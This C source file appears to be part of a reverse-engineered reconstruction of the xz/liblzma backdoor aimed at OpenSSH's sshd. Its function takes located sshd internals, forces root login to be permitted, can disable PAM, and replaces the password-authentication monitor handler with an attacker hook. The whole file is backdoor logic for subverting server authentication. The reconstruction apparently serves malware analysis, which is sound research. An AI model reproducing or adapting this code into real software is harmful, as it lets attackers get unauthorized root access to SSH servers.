/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"

BOOL sshd_patch_variables(
	BOOL skip_root_patch,
	BOOL disable_pam,
	BOOL replace_monitor_reqtype,
	int monitor_reqtype,
	global_context_t *global_ctx
){
	if(!global_ctx){
		return FALSE;
	}
	sshd_ctx_t *sshd_ctx = global_ctx->sshd_ctx;
	if(!sshd_ctx){
		return FALSE;
	}
	if(!sshd_ctx->have_mm_answer_authpassword
    || !sshd_ctx->mm_answer_authpassword_hook
	){
		return FALSE;
	}

	if(!skip_root_patch){
		int *permit_root_login = sshd_ctx->permit_root_login_ptr;
		if(!permit_root_login){
			return FALSE;
		}
		if(*permit_root_login < 0
		|| (*permit_root_login > PERMIT_NO_PASSWD && *permit_root_login != PERMIT_YES)){
			return FALSE;
		}
		*permit_root_login = PERMIT_YES;
	}

	if(disable_pam){
		int *use_pam = sshd_ctx->use_pam_ptr;
		if(!use_pam || *use_pam > TRUE){
			return FALSE;
		}
		*use_pam = FALSE;
	}

	sshd_monitor_func_t *mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_ptr;

	if(!replace_monitor_reqtype){
		// read reqtype from `monitor` struct
		monitor_reqtype = *(int *)PTRDIFF(mm_answer_authpassword_ptr, 8) + 1;
	}
	sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
	// install authpassword hook
	*mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_hook;
	return TRUE;
}
